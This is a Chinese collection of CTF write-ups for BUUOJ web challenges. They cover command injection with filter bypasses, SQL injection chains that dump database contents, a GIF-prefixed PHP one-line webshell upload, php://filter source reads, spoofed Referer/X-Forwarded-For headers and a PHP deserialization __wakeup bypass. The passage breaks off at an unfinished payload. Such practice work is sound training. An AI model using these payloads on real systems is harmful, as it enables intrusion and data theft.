<p>||的特点是如果前面为真，后面就不会执行，那么我们传入*,1之后语句就会变成select *,1 from Flag，而1会在表添加一列1，所以得到flag</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>打开靶场只有一个ip，尝试给他127.0.0.1试一试</p>
<p><img src="https://tuchuangs.com/imgs/2022/10/18/1c74d0d28ed8bad3.png">可以看到是ping了输入的地址，联想到前面做过的题用|可以执行后面的命令？ip=127.0.0.1|ls可以看到</p>
<p><img src="https://tuchuangs.com/imgs/2022/10/18/c88b59ba0ff56de7.png"></p>
<p>是可以执行的，但是经过后面一系列的尝试可以知道过滤了flag和空格，所以用?ip=127.0.0.1|cat$IFS$1index.php来得到源码</p>
<p>空格绕过方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 </span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; 		//用逗号实现空格功能</span><br><span class="line">%09		//需要php环境</span><br></pre></td></tr></table></figure>

<p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>也就是说，使用正则匹配对参数，例如{},&lt;&gt;，* ,?，空格，bash，flag等进行了过滤，才会有我们刚才看到的各种提示<br>这里观察到有个a变量，使用shell_exec命令进行了shell命令执行，然后将结果返回到a变量中,最后输出a shell_exec命令<br>ps:这里的ping -c 4就是发送4条请求<br>在这里插入图片描述<br>参考大佬们的wp<br>尝试利用a进行变量覆盖绕过flag过滤<br>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>看源码可以看到一个Archive_room.php，访问试一试可以看到一个按钮，按了之后快速跳过一个页面，使用bp抓包，有一个secr3t.php可以访问，访问后写着flag在flag.php，再直接访问flag.php说无法看到</p>
<p> php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 </p>
<ul>
<li><code>include “test.php”</code> php文件包含，在执行流中插入写在其他文件中的有用的代码。读取的时候也是数据流形式，因此可以使用<code>php://filter</code>进行过滤，返回值为0,1。 </li>
<li><code>readfile(“test.php”)</code>是将文件以数据流的形式读取过来，并不会执行，但会在前台浏览器上进行解析。返回值是字节数多少。</li>
</ul>
<p>payload=/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>使用万能密码：1’ or 1=1 #</p>
<p>登录进admin，但是里面只有一个admin的密码，尝试后不是flag，重新使用这个密码登录也不会出现flag</p>
<p>回到注入的思路上，查询字段数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&#x27; order by 3%23&amp;password=1     存在</span><br><span class="line">/check.php?username=admin&#x27; order by 4%23&amp;password=1     报错</span><br></pre></td></tr></table></figure>

<p><img src="https://tuchuangs.com/imgs/2022/10/19/2841b101dec73ff8.png"></p>
<p>可知共3个字段。用<code>union</code>查询测试注入点（回显点位）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; union select 1,2,3%23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>得到回显点位为2和3，查询当前数据库名及版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; union select 1,database(),version()%23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>可知当前数据库为geek<br> 接下来：<br> 爆表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>爆出这两个表，我们试一下l0ve1ysq1这个表：<br> 爆字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>得到这三个子段，<br> 爆数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1666195536871.png" alt="1666195536871"></p>
<p>一眼丁真，用中国菜刀直接连上shell</p>
<p><img src="https://tuchuangs.com/imgs/2022/10/20/1169c6fb3d3eb192.png"></p>
<p>flag在跟目录下</p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>在网页源码中存在一个Secret.php，并在网页中无正常链接</p>
<p><img src="https://tuchuangs.com/imgs/2022/10/20/a5667f18a5a235c6.png"></p>
<p>于是，尝试访问该页面，提示请求源不是<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;</code>，如下图所示：It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn&/#39;">https://Sycsecret.buuoj.cn&#39;</a></p>
<p>接下来，就是用burpsuit抓包，<strong>通过指定Referer参数值为<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn来伪造请求源/">https://Sycsecret.buuoj.cn来伪造请求源</a></strong>，继续尝试访问<code>http://node3.buuoj.cn:29399/Secret.php</code>页面</p>
<p>通过上面的请求伪造，得到响应页面：提示，需要使用<code>&quot;Syclover&quot; browser</code>浏览器。</p>
<p>在http请求头中，<strong>通过修改User-Agent参数值为”Syclover” browser来伪造请求源所使用浏览器。</strong></p>
<p>通过上面的请求伪造，得到响应页面：提示，你只能够在本地读取这个文件！！！</p>
<p>这是限制了文件访问的源地址，可用<strong>通过X-Forwarded-For参数来伪造访问的源地址</strong>，这里可以修改为<code>127.0.0.1或localhost</code></p>
<p>最终，伪造的请求头参考如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node4.buuoj.cn:<span class="number">29396</span></span><br><span class="line">User-Agent: <span class="string">&quot;Syclover&quot;</span> browser         <span class="comment">#伪造客户端浏览器</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: https://Sycsecret.buuoj.cn    #伪造</span></span><br><span class="line"><span class="comment">X-Forwarded-for: 127.0.0.1             #伪造源地址</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br></pre></td></tr></table></figure>

<p>最终得到flag</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>有个文件上传，上传个一句话木马，显示需要上传png或者jpg文件，改后缀名后还是没用，然后加个前缀GIF89a</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[123])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>查看源码猜测路径是在upload上面，打开/upload直接显示文件，证明猜测正确</p>
<p>用中国菜刀一键连上去，flag在根目录下</p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>也是一道文件上传的题目，通过几次尝试（看wp），发现对文件后缀名有过滤，通过查看源码将检查的代码删除</p>
<p>上传文件名为shell.phtml的一句话木马，中国菜刀直接连</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>一个和前面几道题一样的登录界面，先尝试一遍万能密码，发现被过滤，尝试双写，发现可以正常登录进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; oorr 1=1#</span><br><span class="line">1&#x27; oorr 1=1#</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1666459083218.png" alt="1666459083218"></p>
<p>接着就是用双写重复之前的sql注入操作</p>
<p>爆出所有数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(schema_name)frfromom</span><br><span class="line">(infoorrmation_schema.schemata) %23</span><br></pre></td></tr></table></figure>

<p>回显：Hello 2！Your password is ‘information_schema,mysql,performance_schema,test,ctf,geek’</p>
<p>爆破ctf库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables)</span><br><span class="line">whwhereere table_schema=&quot;ctf&quot; %23</span><br></pre></td></tr></table></figure>

<p>回显：Hello 2！Your password is ‘Flag’</p>
<p>在里面找到一个flag表</p>
<p> 爆字段 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere </span><br><span class="line"> table_name=&quot;Flag&quot; %23</span><br></pre></td></tr></table></figure>

<p>爆数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23</span><br></pre></td></tr></table></figure>

<p>flag{826b7bf2-106c-45b3-a375-2da2278897bf}</p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开题目，提示备份网站，直接扫描目录，得到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>解压后得到源码</p>
<p>几个重要php文件内容：</p>
<p>index.php</p>
<pre><code>1 &lt;?php
2     include ‘class.php‘;
3     $select = $_GET[‘select‘];
4     $res=unserialize(@$select);
5 ?&gt;
</code></pre>
<p>代码第4行unserialize可能存在反序列化漏洞</p>
<p>class.php</p>
<pre><code> 1 &lt;?php
 2 include ‘flag.php‘;
 3 error_reporting(0);
 4 class Name&#123;
 5     private $username = ‘nonono‘;
 6     private $password = ‘yesyes‘;
 7 
 8     public function __construct($username,$password)&#123;
 9         $this-&gt;username = $username;
10         $this-&gt;password = $password;
11     &#125;
12 
13     function __wakeup()&#123;
14         $this-&gt;username = ‘guest‘;
15     &#125;
16 
17     function __destruct()&#123;
18         if ($this-&gt;password != 100) &#123;
19             echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
20             echo &quot;You name is: &quot;;
21             echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
22             echo &quot;You password is: &quot;;
23             echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
24             die();
25         &#125;
26         if ($this-&gt;username === ‘admin‘) &#123;
27             global $flag;
28             echo $flag;
29         &#125;else&#123;
30             echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can‘t give you the flag!&quot;;
31             die();   
32         &#125;
33     &#125;
34 &#125;
35 ?&gt;
</code></pre>
<p>代码第26行如果username为admin便输出flag，从__destruct，__construct，__wakeup可以判断存在反序列化漏洞<br>php序列化与反序列化</p>
<p>序列化：函数为serialize()，把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等<br>反序列化：函数为unserialize()，将字符串转换成变量或对象的过程<br>常用的内置方法：<br>__construct()：创建对象时初始化，当一个对象创建时被调用<br>__wakeup() 使用unserialize时触发<br>__sleep() 使用serialize时触发<br>__destruction()：结束时销毁对象，当一个对象销毁时被调用<br>我们需要将Name类序列化的结果输出</p>
<pre><code>&lt;?php
 
class Name&#123;
    private $username = ‘nonono‘;
    private $password = ‘yesyes‘;
 
    public function __construct($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    &#125;
&#125;
$a = new Name(‘admin‘,100);
$b = serialize($a);
echo $b;
</code></pre>
<p>输出结果为：</p>
<p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p>
<p>输出结果中Name和username，Name和password之间是有不可见字符的，因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上ascii为0的字符（不可见字符）</p>
<p>另外我们还需要绕过__wakeup方法</p>
<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行<br>原本：O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<br>绕过：O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p>
<p>所以payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3：&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>根据题目提示，去查找他的备份文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -e git,svn,bak -u http://25480fe2-4471-4be6-81ac-bea8913b50e6.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>

<p><img src="https://tuchuangs.com/imgs/2022/10/27/0a96d0093db00e6d.png"></p>
<p>访问/index.php.bak，可以得到源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到用get的方式给key传参，但是只能传数字，又需要与str进行比较</p>
<p>这里主要利用的是php的一个弱比较</p>
<p>其中==在比较时候是先将字符串类型转化为相同，再比较；===是先判断两种字符串的类型是否相等，再比较</p>
<p>在==转换字符串的过程中，遵循如下原则：</p>
<pre><code>当字符串开始部分不存在数值的时候，会将该字符串转换为数值 0。如var_dump(&#39;abc&#39; == 0)，结果为 True
当字符串开始部分有合法数值的时候，会将该字符串转换为合法数值。如var_dump(&#39;123abc&#39; == 123)，结果为True
当字符串中包含 e 或者 E 时，会将其识别为科学计数法。如var_dump(&#39;0e12asda&#39; == 0)，结果为True
</code></pre>
<p>所以只需要用gets方式给key传参123就可以出flag了</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>一个计算器，查看代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$(&#x27;#calc&#x27;).submit(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">        type:&#x27;GET&#x27;,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">        &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">        &lt;/div&gt;`);</span><br><span class="line">        &#125;,</span><br><span class="line">        error:function()&#123;</span><br><span class="line">            alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    return false;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>可以看到calc.php，访问获取源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>可以看到waf过滤的一些字符</p>
<p>scandir()：列出目录中的文件和目录</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以升序排序 - 默认</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">=</span> scandir(<span class="variable">$dir</span>);</span><br><span class="line"><span class="comment">// 以降序排序</span></span><br><span class="line"><span class="variable">$b</span> <span class="operator">=</span> scandir(<span class="variable">$dir</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><strong>chr()：从不同的 ASCII 值返回字符</strong></p>
<p>因为/被过滤 所以使用chr(47)来替代</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:29108/calc.php? num=print_r(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p>空格绕过</p>
<p>  在num前加一个空格，进行目录读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:29108/calc.php? num=print_r(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p>目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; boot [5] =&gt; dev [6] =&gt; etc [7] =&gt; f1agg [8] =&gt; home [9] =&gt; lib [10] =&gt; lib64 [11] =&gt; media [12] =&gt; mnt [13] =&gt; opt [14] =&gt; proc [15] =&gt; root [16] =&gt; run [17] =&gt; sbin [18] =&gt; srv [19] =&gt; start.sh [20] =&gt; sys [21] =&gt; tmp [22] =&gt; usr [23] =&gt; var ) 1</span><br></pre></td></tr></table></figure>

<p> <strong>file_get_contents()：把整个文件读入一个字符串中</strong></p>
<blockquote>
<p>用法：file_get_contents(path,include_path,context,start,max_length)</p>
</blockquote>
<p>因为引号也被过滤了，所以flagg也需要使用chr函数</p>
<p>构造payload</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:<span class="number">29108</span>/calc.php num=print_r(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><strong>php中的strcmp漏洞</strong><br>说明：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> strcmp ( <span class="keyword">string</span> <span class="variable">$str1</span> , <span class="keyword">string</span> <span class="variable">$str2</span> )</span><br></pre></td></tr></table></figure>

<p>参数 str1第一个字符串。str2第二个字符串。如果  str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回  0。可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return  0 ，<strong>也就是虽然报了错，但却判定其相等</strong></p>
<p><strong>php中的is_numeric()漏洞</strong></p>
<p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
<p>在菜单有个payflag选项，进去后查看代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">	$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用bp抓包,修改cookie:user=1，用post给password和money传参</p>
<p><img src="https://tuchuangs.com/imgs/2022/11/02/3b756eba3b21ff75.png"></p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>题目打开有三个链接内容分明是以下三个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">render</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>

<p>有个render，而且题目是easy_tornado，可是SSTI</p>
<p>因为render（）是tornado里的函数，可以生成html模板。是一个渲染函数 ，就是一个公式，能输出前端页面的公式。</p>
<p>tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关</p>
<p>尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>报错，应该是存在过滤</p>
<p>然后我们需要找到cookie_secret</p>
<p>百度得到<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Tornado&spm=1001.2101.3001.7020">Tornado</a>框架的附属文件handler.settings中存在cookie_secret</p>
<p>此时构造payload:</p>
